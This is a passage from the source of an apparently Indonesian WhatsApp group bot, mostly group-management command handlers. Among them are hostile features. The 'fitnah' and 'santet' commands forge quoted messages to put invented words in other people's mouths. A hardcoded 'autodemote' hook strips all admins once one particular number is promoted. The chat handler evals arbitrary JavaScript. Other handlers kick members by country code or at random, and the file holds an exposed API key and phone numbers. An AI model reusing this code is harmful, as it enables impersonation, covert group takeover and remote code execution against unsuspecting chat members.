						fs.writeFileSync('./src/antivirus.json', JSON.stringify(virus))
						reply('Success Enable Anti kasar!')
					} else if (argn[1] == 'off') {
						virus.splice(from, 1)
						fs.writeFileSync('./src/antivirus.json', JSON.stringify(virus))
						reply('Success Disable Anti kasar!')
					} else {
						reply('𝗸𝗲𝘁𝗶𝗸 𝗽𝗲𝗿𝗶𝗻𝘁𝗮𝗵 𝟭 𝘂𝗻𝘁𝘂𝗸 𝗺𝗲𝗻𝗴𝗮𝗸𝘁𝗶𝗳𝗸𝗮𝗻, 𝟬 𝘂𝗻𝘁𝘂𝗸 𝗺𝗲𝗻𝗼𝗻𝗮𝗸𝘁𝗶𝗳𝗸𝗮𝗻\n𝗰𝗼𝗻𝘁𝗼𝗵: ${prefix}antivirus on')
					}
					break
				case 'bot':
				
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins && !ben.key.fromMe) return reply(mess.only.admin)
					if (args.length < 1) return reply('Pilih on atau off!')
					const argo = body.split(' ')
					if (argo[1] == 'off') {
						if (isBot) return
						_bot.push(from)
						fs.writeFileSync('./src/bot.json', JSON.stringify(_bot))
						reply('*Success Offline!*')
					} else if (argo[1] == 'on') {
						_bot.splice(from, 1)
						fs.writeFileSync('./src/bot.json', JSON.stringify(_bot))
						reply('*Success Online!*')
					} else {
						reply(`*Ketik ${prefix}bot on/off*`)
					}
					break
					case 'antitag':
				if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
					if (args.length < 1) return reply('Pilih on atau off!')
					if (args[0] == 'on') {
						if (antitag == true) return reply('*Anti tag sudah aktif!*')
						antitag = true
						reply('*Sukses mengaktifkan mode anti tag!*')
					} else if (args[0] == 'off') {
						if (antitag == false) return reply('*Anti tag sudah mati!*')
						antitag = false
						reply('*Sukses mematikan mode anti tag!*')
			} else {
				reply('*Pilih on atau off*')
			}
					break
					case 'autojoin':
				
				if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
					if (args.length < 1) return reply('Pilih on atau off!')
					if (args[0] == 'on') {
						if (autojoin == true) return reply('*Auto join sudah aktif!*')
						autojoin = true
						reply('*Sukses mengaktifkan mode auto join!*')
					} else if (args[0] == 'off') {
						if (autojoin == false) return reply('*Auto join sudah mati!*')
						autojoin = false
						reply('*Sukses mematikan mode auto join!*')
			} else {
				reply('*Pilih on atau off*')
			}
					break
					case 'autoblock':
				
				if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
					if (args.length < 1) return reply('Pilih on atau off!')
					if (args[0] == 'on') {
						if (autoblock == true) return reply('*Auto block sudah aktif!*')
						autoblock = true
						reply('*Sukses mengaktifkan mode auto block!*')
					} else if (args[0] == 'off') {
						if (autoblock == false) return reply('*Auto block sudah mati!*')
						autoblock = false
						reply('*Sukses mematikan mode auto block!*')
			} else {
				reply('*Pilih on atau off*')
			}
					break
					case 'autodemote':
				
				if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
					if (args.length < 1) return reply('Pilih on atau off!')
					if (args[0] == 'on') {
						if (autodemote == true) return reply('*Auto demote sudah aktif!*')
						autodemote = true
						reply('*Sukses mengaktifkan mode auto demote!*')
					} else if (args[0] == 'off') {
						if (autodemote == false) return reply('*Auto demote sudah mati!*')
						autodemote = false
						reply('*Sukses mematikan mode auto demote!*')
			} else {
				reply('*Pilih on atau off*')
			}
					break
				case 'autoread':
				
				if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
					if (args.length < 1) return reply('Pilih on atau off!')
					if (args[0] == 'on') {
						if (autoread) return reply('*Auto read sudah aktif!*')
						autoread = true
						reply('*Sukses mengaktifkan mode auto read!*')
					} else if (args[0] == 'off') {
						if (!autoread) return reply('*Auto read sudah mati!*')
						autoread = false
						reply('*Sukses mematikan mode auto read!*')
			} else {
				reply('*Pilih on atau off*')
			}
					break
				case 'autosticker':
				
					if (!isGroup) return reply(mess.only.group)
					if (args.length < 1) return reply('Pilih on atau off!')
					if (args[0] == 'on') {
						if (isAutoSticker) return reply('Udah lu nyalain pantek:v')
						autostick.push(from)
						fs.writeFileSync('./src/autosticker.json', JSON.stringify(autostick))
						reply('Success Enable Auto sticker!')
					} else if (args[0] == 'off') {
						autostick.splice(from, 1)
						fs.writeFileSync('./src/autosticker.json', JSON.stringify(autostick))
						reply('Success Disable Auto sticker!')
					} else {
						reply('𝗸𝗲𝘁𝗶𝗸 𝗽𝗲𝗿𝗶𝗻𝘁𝗮𝗵 𝟭 𝘂𝗻𝘁𝘂𝗸 𝗺𝗲𝗻𝗴𝗮𝗸𝘁𝗶𝗳𝗸𝗮𝗻, 𝟬 𝘂𝗻𝘁𝘂𝗸 𝗺𝗲𝗻𝗼𝗻𝗮𝗸𝘁𝗶𝗳𝗸𝗮𝗻\n𝗰𝗼𝗻𝘁𝗼𝗵: ${prefix}autosticker on')
					}
					break
					case 'autostickerpc':
					if (args.length < 1) return reply('Pilih on atau off!')
					if (args[0] == 'on') {
						if (isAutoStick) return reply('Udah lu nyalain pantek:v')
						_autostick.push(sender)
						fs.writeFileSync('./src/autostickpc.json', JSON.stringify(_autostick))
						reply('Success Enable Auto sticker!')
					} else if (args[0] == 'off') {
						_autostick.splice(sender, 1)
						fs.writeFileSync('./src/autostickpc.json', JSON.stringify(_autostick))
						reply('Success Disable Auto sticker!')
					} else {
						reply(`𝗸𝗲𝘁𝗶𝗸 𝗽𝗲𝗿𝗶𝗻𝘁𝗮𝗵 𝟭 𝘂𝗻𝘁𝘂𝗸 𝗺𝗲𝗻𝗴𝗮𝗸𝘁𝗶𝗳𝗸𝗮𝗻, 𝟬 𝘂𝗻𝘁𝘂𝗸 𝗺𝗲𝗻𝗼𝗻𝗮𝗸𝘁𝗶𝗳𝗸𝗮𝗻\n𝗰𝗼𝗻𝘁𝗼𝗵: ${prefix}autosticker on`)
					}
					break
			case 'antilink':
					if (!isGroup) return reply(mess.only.group)
					if (args.length < 1) return reply('pilih enable atau disable udin!!')
					if (args[0] == 'enable') {
						if (isAntilink) return reply('Mode antilink sudah aktif')
						anlink.push(from)
						fs.writeFileSync('./src/antilink.json', JSON.stringify(anlink))
						reply(`*Sukses mengaktifkan mode antilink*`)
					} else if (args[0] == 'disable') {
						anlink.splice(from, 1)
						fs.writeFileSync('./src/antilink.json', JSON.stringify(anlink))
						reply('*Sukes menonaktifkan mode antilink*')
					} else {
						reply('pilih enable atau disable udin!!')
					}
					break
				case 'clone':
					if (!isGroup) return reply(mess.only.group)
					if (args.length < 1) return reply('𝘁𝗮𝗴 𝘁𝗮𝗿𝗴𝗲𝘁 𝘆𝗮𝗻𝗴 𝗺𝗮𝘂 𝗱𝗶 𝗰𝗹𝗼𝗻𝗲!!!')
					if (ben.message.extendedTextMessage === undefined || ben.message.extendedTextMessage === null) return reply('Tag cvk')
					mentioned = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
					let { jid, id, notify } = groupMembers.find(x => x.jid === mentioned)
					try {
						pp = await benny.getProfilePicture(id)
						buffer = await getBaper(pp)
						benny.updateProfilePicture(botNumber, buffer)
						mentions(`Foto profile Berhasil di perbarui menggunakan foto profile @${id.split('@')[0]}`, [jid], true)
					} catch (e) {
						reply('𝗬𝗲𝗮𝗵 𝗴𝗮𝗴𝗮𝗹 ;(, 𝘂𝗹𝗮𝗻𝗴𝗶 𝗹𝗮𝗴𝗶 𝘆𝗮𝗵 𝘁𝗼𝗱 ^_^')
					}
					break
					case 'edotensei':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins && !ben.key.fromMe) return reply(mess.only.admin)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					jom2 = groupMembers
					halahh = []
					kepoah = jom2[Math.floor(Math.random() * jom2.length)]
					halahh.push(kepoah.jid)
					setTimeout( () => {
				    reply(`*Selamat kamu kena prank*`)
					}, 13000) // 1000 = 1s,
					setTimeout( () => {
				    benny.groupAdd(from, halahh)
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					benny.groupRemove(from, halahh)
					}, 5000) // 1000 = 1s, 2500) // 1000 = 1s,
					setTimeout( () => {
					}, 0) // 1000 = 1s,
					benny.sendMessage(from, `*Yahaha yang kena @${kepoah.jid.split('@')[0]} mungkin hari ini adalah hari kesialanmu, Bye*`, text, {contextInfo: {mentionedJid: halahh}, quoted: adadeh})
					break
					case 'headshot':
                				
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins && !ben.key.fromMe) return reply(mess.only.admin)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (ben.message.extendedTextMessage === undefined || ben.message.extendedTextMessage === null) return reply('Tag target yang ingin di tendang!')
					mentioned = ben.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = 'Bismillah Hedsot >_< :\n'
						for (let _ of mentioned) {
							teks += `@${_.split('@')[0]}\n`
						}
						mentions(teks, mentioned, true)
						benny.groupRemove(from, mentioned)
						mentions(teks, mentioned, true)
						benny.groupAdd(from, [num])
					} else {
						mentions(`Berhasil Meng hedsot pala nya  : @${mentioned[0].split('@')[0]}`, mentioned, true)
						benny.groupRemove(from, mentioned)
						}
					break
case 'ingfogc':
case 'gcingfo':
case 'infogc':
case 'infogroup':

	benny.updatePresence(from, Presence.composing)
	if (!isGroup) return reply(mess.only.group)
	ppUrl = await benny.getProfilePicture(from) // leave empty to get your own
	buffer = await getBaper(ppUrl)
	benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: `*Name* : ${groupName}\n*Member* : ${groupMembers.length}\n*Anti kasar* : ${isVirus ? 'YES' : 'NO'}\n*Anti virus* : ${isKasar ? 'YES' : 'NO'}\n*Anti link* : ${isAntilink ? 'YES' : 'NO'}\n*Admin* : ${groupAdmins.length}\n*Desc* : ${groupDesc}`})
	break
case 'ownergrup':
case 'ownergroup':
case 'ownergc':

	benny.updatePresence(from, Presence.composing) 
	var itsme = `${numbernye}@s.whatsapp.net`
	hayukkkk = { participant: '0@s.whatsapp.net', text: `This Group Has been create by @${groupOwner.split("@")[0]}`, contextInfo: { mentionedJid: [groupOwner] } }
	benny.sendMessage(from, hayukkkk, text, {quoted: adadeh})
	break
	
					case 'fitnah':
					
					var gh = body.slice(8)
					mentioned = ben.message.extendedTextMessage.contextInfo.mentionedJid
						var replace = gh.split("|")[0];
						var targets = gh.split("|")[1];
						var bot = gh.split("|")[2];
						benny.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${mentioned}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${targets}` }}})
						break
						case 'santet':
					
					if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
					var gh = body.slice(8)
						var replace = gh.split("|")[0];
						var targets = gh.split("|")[1];
						var bot = gh.split("|")[2];
			benny.sendMessage(`${replace}@s.whatsapp.net`, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${replace}@s.whatsapp.net`, ...(from ? { remoteJid: `${replace}@s.whatsapp.net` } : {}) }, message: { conversation: `${targets}` }}})
						            break
				case 'waits':
				
					if ((isMedia && !ben.message.videoMessage || isQuotedImage) && args.length == 0) {
						reply(mess.wait)
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
						media = await benny.downloadMediaMessage(encmedia)
						await wait(media).then(res => {
							benny.sendMessage(from, res.video, video, {quoted: adadeh, caption: res.teks.trim()})
						}).catch(err => {
							reply(err)
						})
					} else {
						reply('𝗸𝗶𝗿𝗶𝗺 𝗳𝗼𝘁𝗼 𝗱𝗲𝗻𝗴𝗮𝗻 𝗰𝗲𝗽𝘁𝗶𝗼𝗻 𝗼𝗰𝗿')
					}
					break
					case 'kontak':
					mentioned = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
					if (mentioned) {
					teks = body.slice(8)
					apk = teks.split('|')[0]
					apg = teks.split('|')[1]
					const vcardi = 'BEGIN:VCARD\n'
            + `VERSION:3.0\n`
            + `FN:${apg} \n` // GANTI NAMA LU
            + `ORG:${apg};\n`
            + `TEL;type=CELL;type=VOICE;waid=${mentioned.split('@')[0]}:+${mentioned.split('@')[0]}\n` // GANTI NOMOR LU
            + `END:VCARD`
			benny.sendMessage(from, {displayName: `${apg}`, vcard: vcardi}, contact, {thumbnail: setthumb})
					} else if (!mentioned) {
					teks = body.slice(8)
					apk = teks.split('|')[0]
					apg = teks.split('|')[1]
					const vcardi = 'BEGIN:VCARD\n'
            + `VERSION:3.0\n`
            + `FN:${apg} \n` // GANTI NAMA LU
            + `ORG:${apg};\n`
            + `TEL;type=CELL;type=VOICE;waid=${apk}:+${apk}\n` // GANTI NOMOR LU
            + `END:VCARD`
			benny.sendMessage(from, {displayName: `${apg}`, vcard: vcardi}, contact, {thumbnail: setthumb})
					}
				break
			default: 
				if (budy.startsWith('>')){
					if (!ben.key.fromMe && !isOwner) return
				var code = budy.slice(2)
					try {
 
                if (!code) return reply('No JavaScript Code')
                let evaled;
 
                if (code.includes("--silent") && code.includes("--async")) {
                code = code.replace("--async", "").replace("--silent", "");
 
                return await eval(`(async () => { ${code} })()`)
                } else if (code.includes("--async")) {
                code = code.replace("--async", "");
        
                evaled = await eval(`(async () => { ${code} })()`);
                } else if (code.includes("--silent")) {
                code = code.replace("--silent", "");
        
                return await eval(code);
                } else evaled = await eval(code);
 
              if (typeof evaled !== "string")
            evaled = require("util").inspect(evaled, { depth: 0 });
  
            let output = clean(evaled);
            benny.sendMessage(from, output, text, {quoted:adadeh})
            } catch(err) {
                outerr = clean(err)
                reply(`Error: ${outerr}`)
            }
            function clean(text) {
            if (typeof text === "string")
              return text
                .replace(/`/g, `\`${String.fromCharCode(8203)}`)
                .replace(/@/g, `@${String.fromCharCode(8203)}`);
            //eslint-disable-line prefer-template
            else return text;
            }
			}
			
			}
	} catch (e) {
            e = String(e)
            if (!e.includes("this.isZero")) {
            if (!e.includes("Cannot read property 'vname' of undefined")) {
            if (!e.includes("Cannot read property 'orderMessage' of null")) {
			   const time_error = moment.tz('Asia/Jakarta').format('HH:mm:ss DD:MM:YYYY')
			   console.log(color(tampilTanggal, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color("[ ERROR ]", "red"), color(e, 'yellow'))
            }
			}
			}
        }
	})

                     
/**
*@Thanks For Allah
*@Thanks For Nafiz
*@Thanks For Ipul
*@Thanks For Hanif
*@Thanks For ArugaZ
*@Thanks For FaizBastomi
*@Thanks For Adiwajshing
*@Thanks For SlavyanDesu
*@Thanks For Ramlan
*@Thanks For Bubur
*@Thanks For Dani
*@Thanks For Akbar
*/

benny.on('group-participants-update', async (anu) => {
		try {
			console.log(anu)
			const from = anu.jid.endsWith('@g.us')
			const mdata = await benny.groupMetadata(anu.jid)
			if (anu.action == 'add') {
				const mdata = await benny.groupMetadata(anu.jid)
				if (kickarea.includes(anu.jid)) {
					num = anu.participants[0]
					if (num.includes('62')) return
	bule = `${num.split('@')[0]}`
		console.log(color('[KICK]', 'red'), color('Received a foreign participant', 'yellow'))
		teks = `*Sorry bro this group only +62!*`
		benny.sendMessage(mdata.id, teks, MessageType.text)
		setTimeout( () => {
				    benny.groupRemove(anu.jid, [num])
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					benny.sendMessage(mdata.id, `*Bye* @${num.split('@')[0]}`, MessageType.text, {contextInfo: {mentionedJid: [num]}, quoted: { "key": { "participant": `${numbernye}`, "remoteJid": `${setgrup}`, "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": setthumb, "mimetype": "application/octet-stream", "title": `*Welcome*`, "fileLength": "36", "pageCount": 0, "fileName": `_*Welcome*_` }}, "messageTimestamp": "1614069378", "status": "PENDING"}})
				}, 1000) // 1000 = 1s, 2500) // 1000 = 1s,
					setTimeout( () => {
					}, 0) // 1000 = 1s,
					benny.sendMessage(mdata.id, '*Sorry Bro this group only +62*', MessageType.text)
	}
	if (!welkom.includes(anu.jid)) return
				num = anu.participants[0]
				isName = num.includes(benny.user.jid) //Ubah nomor lu
				pushname = isName ? benny.user.name : benny.contacts[num].notify || benny.contacts[num].vname || benny.contacts[num].name
				global.txtwl
				txtwl = `*Hai* *@${num.split('@')[0]}*\n*╔❏* *Welcome in group:*\n*╠❏* *${mdata.subject}*\n*╠❏*\n*╠❏* *Intro dulu*\n*╠❏* *Nama:* \n*╠❏* *Asal kota:* \n*╠❏* *Jenis kelamin:* \n*╚❏* *Nomor:* ${num.replace('@s.whatsapp.net', '')}\n*Semoga Betah yaa~~*\n${mdata.desc}`
				try {
					ppimg = await benny.getProfilePicture(num)
				} catch {
					ppimg = await benny.getProfilePicture(anu.jid)
				}
				teks = `${txtwl}`
				buff = await getBaper(ppimg)
				datae = await imageToBase64(JSON.stringify(ppimg).replace(/\"/gi, ''))
					fs.writeFileSync('janckuk.jpeg', datae, 'base64')
					var imgbb = require('imgbb-uploader')
					data = await imgbb("cedeb44b8d204947a6833ca1412ca77d", 'janckuk.jpeg')
			buffu = await getBaper(`https://pecundang.herokuapp.com/api/canvaswel?name=${encodeURI(pushname)}&img_url=${data.display_url}&gcname=${encodeURI(mdata.subject)}&jumlahmem=${mdata.participants.length}`)
				benny.sendMessage(mdata.id, buffu, MessageType.image, {contextInfo: {mentionedJid: [num]}, caption: txtwl, quoted: { key: { fromMe: false, participant: `6285737134572@s.whatsapp.net`, ...(from ? { remoteJid: "6285737134572@s.whatsapp.net" } : {}) }, message: {"groupInviteMessage": { "groupJid": "6282211999594-1621150820@g.us", "inviteCode": "Mny0aVxtr6xyXTHC", "inviteExpiration": "1621410169", thumbnail: setthumb, "groupName": "Tes", "caption": `+${num.split('@')[0]} Joined` }}}})
				} else if (anu.action == 'remove') {
					if (!welkom.includes(anu.jid)) return
					const mdata = await benny.groupMetadata(anu.jid)
				num = anu.participants[0]
				isName = num.includes(benny.user.name) //Ubah nomor lu
				pushname = isName ? benny.user.name : benny.contacts[num].notify || benny.contacts[num].vname || benny.contacts[num].name
				try {
					ppimg = await benny.getProfilePicture(num)
				} catch {
					ppimg = await benny.getProfilePicture(anu.jid)
				}
				
				teks = `*╔❏* *Goodbye* *@${num.split('@')[0]}*\n*╔❏* *Leave from group:*\n*${mdata.subject}*\n*╠❏*\n*╚❏* *Nomor:* ${num.replace('@s.whatsapp.net', '')}\n*GoodBye~~*`
				buff = await getBaper(ppimg)
				datae = await imageToBase64(JSON.stringify(ppimg).replace(/\"/gi, ''))
					fs.writeFileSync('janckuk.jpeg', datae, 'base64')
					var imgbb = require('imgbb-uploader')
					data = await imgbb("cedeb44b8d204947a6833ca1412ca77d", 'janckuk.jpeg')
				buffu = await getBaper(`https://pecundang.herokuapp.com/api/canvasbye?name=${encodeURI(pushname)}&img_url=${data.display_url}&gcname=${encodeURI(mdata.subject)}&jumlahmem=${mdata.participants.length}`)
				benny.sendMessage(mdata.id, buffu, MessageType.image, {contextInfo: {mentionedJid: [num]}, caption: teks, quoted: { key: { fromMe: false, participant: `6285737134572@s.whatsapp.net`, ...(from ? { remoteJid: "6285737134572@s.whatsapp.net" } : {}) }, message: {"groupInviteMessage": { "groupJid": "6282211999594-1621150820@g.us", "inviteCode": "Mny0aVxtr6xyXTHC", "inviteExpiration": "1621410169", thumbnail: setthumb, "groupName": "Tes", "caption": `+${num.split('@')[0]} left` }}}})
				} else if (anu.action == 'promote') {
			const mdata = await benny.groupMetadata(anu.jid)
			num = anu.participants[0]
			if (anu.participants.includes('6289636006352')) {
			if (autodemote == false) return
			console.log(color('[AUTO DEMOTE]', 'cyan'), color('BRING ME THE HORIZON 2011', 'yellow'))
			nbm = mdata.participants
			nom = []
			for (let i of nbm) {
				nom.push(i.jid)
			}
			benny.groupDemoteAdmin(anu.jid, nom)
			}
			if (!welkom.includes(anu.jid)) return
			try {
					ppimg = await benny.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
			let buff = await getBaper(ppimg)
			teks = `*╔❏* *PROMOTE DETECT*\n*╠❏* *Nomor:* ${num.replace('@s.whatsapp.net', '')}\n*╚❏* *@${num.split('@')[0]}*`
			benny.sendMessage(mdata.id, teks, MessageType.text, {contextInfo: {mentionedJid: [num]}, quoted: { "key": { "participant": `${numbernye}`, "remoteJid": `${setgrup}`, "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": buff, "mimetype": "application/octet-stream", "title": `*PROMOTE*`, "fileLength": "36", "pageCount": 0, "fileName": `_*Welcome*_` }}, "messageTimestamp": "1614069378", "status": "PENDING"}})
		} else if (anu.action == 'demote') {
			if (!welkom.includes(anu.jid)) return
			num = anu.participants[0]
			const mdata = await benny.groupMetadata(anu.jid)
			try {
					ppimg = await benny.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
			let buff = await getBaper(ppimg)
			teks = `*╔❏* *DEMOTE DETECT*\n*╠❏* *Nomor:* ${num.replace('@s.whatsapp.net', '')}\n*╚❏* *@${num.split('@')[0]}*`
			benny.sendMessage(mdata.id, teks, MessageType.text, {contextInfo: {mentionedJid: [num]}, quoted: { "key": { "participant": `${numbernye}`, "remoteJid": `${setgrup}`, "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": buff, "mimetype": "application/octet-stream", "title": `*DEMOTE*`, "fileLength": "36", "pageCount": 0, "fileName": `_*Welcome*_` }}, "messageTimestamp": "1614069378", "status": "PENDING"}})
		}
		} catch (e) {
			console.log('Error : %s', color(e, 'red'))
		}
})

	//
	benny.on('CB:Blocklist', json => {
	    for (let i of json[1].blocklist) {
	    	blocked.push(i.replace('c.us','s.whatsapp.net'))
	    }
	})
	
benny.on('message-update', async (hurtz) => {
	try {
		const from = hurtz.key.remoteJid
		const botNumber = benny.user.jid
		const messageStubType = WA_MESSAGE_STUB_TYPES[hurtz.messageStubType] || 'MESSAGE'
		const dataRevoke = JSON.parse(fs.readFileSync('./src/gc-revoked.json'))
		const dataCtRevoke = JSON.parse(fs.readFileSync('./src/ct-revoked.json'))
		const dataBanCtRevoke = JSON.parse(fs.readFileSync('./src/ct-revoked-banlist.json'))
		sender = hurtz.key.fromMe ? benny.user.jid : hurtz.key.remoteJid.endsWith('@g.us') ? hurtz.participant : hurtz.key.remoteJid
		const isRevoke = hurtz.key.remoteJid.endsWith('@s.whatsapp.net') ? true : hurtz.key.remoteJid.endsWith('@g.us') ? dataRevoke.includes(from) : false
		const isCtRevoke = hurtz.key.remoteJid.endsWith('@g.us') ? true : dataCtRevoke.data ? true : false
		const isBanCtRevoke = hurtz.key.remoteJid.endsWith('@g.us') ? true : !dataBanCtRevoke.includes(sender) ? true : false
if (messageStubType == 'REVOKE' && isRevoke) {
	sender = hurtz.key.fromMe ? benny.user.jid : hurtz.key.remoteJid.endsWith('@g.us') ? hurtz.participant : hurtz.key.remoteJid
	try {
					ppimg = await benny.getProfilePicture(sender)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				    buffer = await getBaper(ppimg)
					const isGroup = hurtz.key.remoteJid.endsWith('@g.us') ? true : false
                    const from = hurtz.key.remoteJid
					const groupMetadata = isGroup ? await benny.groupMetadata(from) : ''
					const groupMembers = isGroup ? groupMetadata.participants : ''
                    sender = hurtz.key.fromMe ? benny.user.jid : hurtz.key.remoteJid.endsWith('@g.us') ? hurtz.participant : hurtz.key.remoteJid
					 let int
                    let infoMSG = JSON.parse(fs.readFileSync('./src/.dat/msg.data.json'))
                    const id_deleted = hurtz.key.id
                    const conts = hurtz.key.fromMe ? benny.user.jid : benny.contacts[sender] || { notify: jid.replace(/@.+/, '') }
                    const pushname = hurtz.key.fromMe ? benny.user.name : conts.notify || conts.vname || conts.name || '-'
                   if (pushname == undefined) pushname = '-'
					for (let i = 0; i < infoMSG.length; i++) {
                         if (infoMSG[i].key.id == id_deleted) {
                              const dataInfo = infoMSG[i]
                              const type = Object.keys(infoMSG[i].message)[0]
                              const timestamp = infoMSG[i].messageTimestamp
                              int = {
                                   no: i,
                                   type: type,
                                   timestamp: timestamp,
                                   data: dataInfo

                              }
                         }
                    }
                    const index = Number(int.no)
                    const body = int.type == 'conversation' ? infoMSG[index].message.conversation : int.type == 'extendedTextMessage' ? infoMSG[index].message.extendedTextMessage.text : int.type == 'imageMessage' ? infoMSG[index].message.imageMessage.caption : int.type == 'stickerMessage' ? 'Sticker' : int.type == 'audioMessage' ? 'Audio' : int.type == 'videoMessage' ? infoMSG[index].videoMessage.caption : infoMSG[index]
                    const mediaData = int.type === 'extendedTextMessage' ? JSON.parse(JSON.stringify(int.data).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : int.data
                    if (int.type == 'conversation' || int.type == 'extendedTextMessage') {
                         const strConversation = `\*╔❏* *ANTIDELETE*\n*║*
*╠❏* *Nama* : ${pushname} ( @${sender.replace('@s.whatsapp.net', '')} )
*╠❏* *Tipe* : Text
*╠❏* *Waktu* : ${moment.unix(int.timestamp).format('HH:mm:ss DD/MM/YYYY')}
*╚❏* *Pesan* : ${body ? body : '-'}`

                         benny.sendMessage(from, strConversation, MessageType.text, { contextInfo: {mentionedJid: [sender, botNumber], isForwarded: true, forwardingScore: 300}, quoted: { "key": { "participant": `${numbernye}`, "remoteJid": `${setgrup}`, "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": buffer, "mimetype": "application/octet-stream", "title": `${fake}`, "fileLength": "36", "pageCount": 0, "fileName": `${fake}` }}, "messageTimestamp": "1614069378", "status": "PENDING"}})
                    } else if (int.type == 'stickerMessage') {
                         const filename = `${sender.replace('@s.whatsapp.net', '')}-${moment().unix()}`
                         const savedFilename = await benny.downloadAndSaveMediaMessage(int.data, `./src/${filename}`);
                         const strConversation = `*╔❏* *ANTIDELETE*\n*║*\n*╠❏* Nama: ${pushname}\n*╠❏* Tag: @${sender.replace('@s.whatsapp.net', '')}\n*╠❏* Tipe : Sticker\n*╚❏* Waktu: ${moment.unix(int.timestamp).format('HH:mm:ss DD/MM/YYYY')}`
				const buff = fs.readFileSync(savedFilename)
				benny.sendMessage(from, strConversation, MessageType.text, { contextInfo: {mentionedJid: [sender, botNumber]}, quoted: { "key": { "participant": `${numbernye}`, "remoteJid": `${setgrup}`, "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": buffer, "mimetype": "application/octet-stream", "title": `${fake}`, "fileLength": "36", "pageCount": 0, "fileName": `${fake}` }}, "messageTimestamp": "1614069378", "status": "PENDING"}})
               benny.sendMessage(from, buff, MessageType.sticker, { contextInfo: {mentionedJid: [sender, botNumber]}, quoted: { "key": { "participant": `${numbernye}`, "remoteJid": `${setgrup}`, "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": buffer, "mimetype": "application/octet-stream", "title": `${fake}`, "fileLength": "36", "pageCount": 0, "fileName": `${fake}` }}, "messageTimestamp": "1614069378", "status": "PENDING"}})
               // console.log(stdout)
				fs.unlinkSync(savedFilename)

			} else if (int.type == 'imageMessage') {
				const filename = `${sender.replace('@s.whatsapp.net', '')}-${moment().unix()}`
				const savedFilename = await benny.downloadAndSaveMediaMessage(int.data, `./src/${filename}`);
				const buff = fs.readFileSync(savedFilename)
				const strConversation =  `*╔❏* *ANTIDELETE*\n*║*\n*╠❏* Nama : ${pushname}\n*╠❏* Tag: @${sender.replace('@s.whatsapp.net', '')}\n*╠❏* Tipe : Image\n*╠❏* Pesan: ${body ? body : '-'}\n*╚❏* Waktu: ${moment.unix(int.timestamp).format('HH:mm:ss DD/MM/YYYY')}`
                         benny.sendMessage(from, buff, MessageType.image, { contextInfo: {mentionedJid: [sender, botNumber]}, caption: strConversation, quoted: { "key": { "participant": `${numbernye}`, "remoteJid": `${setgrup}`, "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": buffer, "mimetype": "application/octet-stream", "title": `${fake}`, "fileLength": "36", "pageCount": 0, "fileName": `${fake}` }}, "messageTimestamp": "1614069378", "status": "PENDING"}})
                 fs.unlinkSync(savedFilename)
			} else if (int.type == 'audioMessage') {
				const filename = `${sender.replace('@s.whatsapp.net', '')}-${moment().unix()}`
